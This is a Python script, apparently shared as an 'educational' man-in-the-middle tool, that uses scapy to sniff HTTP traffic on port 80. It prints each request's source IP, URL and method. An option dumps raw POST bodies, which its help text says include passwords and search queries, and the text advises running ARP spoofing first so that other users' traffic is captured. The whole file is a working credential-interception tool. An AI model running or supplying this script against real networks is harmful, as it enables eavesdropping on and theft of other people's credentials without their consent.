#!/bin/env python
#
#
#	                ███  ██   ██ ██  ████ ██ ██   ██
#                  █     ███  ██    ██        ██ ██
#                   ███  ██ █ ██ ██ ████  ██   ███ 
#                      █ ██  ███ ██ ██    ██  ██ ██
#                   ███  ██   ██ ██ ██    ██ ██   ██
#
#               [ HTTP RAW Data Packet Catcher Script ]
#
#          HTTP Data Packet Catcher Man In The Middle Python Script Design for Testing
#  Purposes & Only For Educational Purposes. source from web, Edited by Thumula Basura
#  Suraweera (anoxtovo). Enjoy :)
#  
#  filename    :     snifix.py
#  language    :     python
#  version     :     version 1.0
#  author      :     Thumula Basura Suraweera (anoxtovo)
#  lisense     :     MIT Lisense 


from scapy.all import *
from scapy.layers.http import HTTPRequest
from colorama import init, Fore
import platform
import subprocess
import argparse

#Initialize colorama
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET

def clearScreen():
    systemType = platform.system()
    if(systemType == "Windows"):
        subprocess.run("cls", shell=True)
    else:
        subprocess.run("clear", shell=True)


def bannerMain():
    clearScreen()
    print("""
     ███  ██   ██ ██  ████ ██ ██   ██
    █     ███  ██    ██        ██ ██
     ███  ██ █ ██ ██ ████  ██   ███ 
        █ ██  ███ ██ ██    ██  ██ ██
     ███  ██   ██ ██ ██    ██ ██   ██

 [ HTTP RAW Data Packet Catcher Script ]\n""")

def sniff_packets(iface=None):
    """
    Sniff 80 Port Packets with 'iface', if None (Default), then the
    scapy's default interface is used 
    """
    
    if iface:
        # port 80 for http (generally)
        # 'process_packet' is the callback
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
    else:
        # sniff with default interface
        sniff(filter="port 80", prn=process_packet,store=False)

def process_packet(packet):
    """
    This Function is executed whenever a packet is sniffed
    """
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request 
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print(f"\n{RED}[*] Receved: {packet[Raw].load}{RESET}")

if __name__ == "__main__":
    bannerMain()
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle. It is suggested that run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as password, search quries, etc.")


    # prase arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw


    sniff_packets(iface)
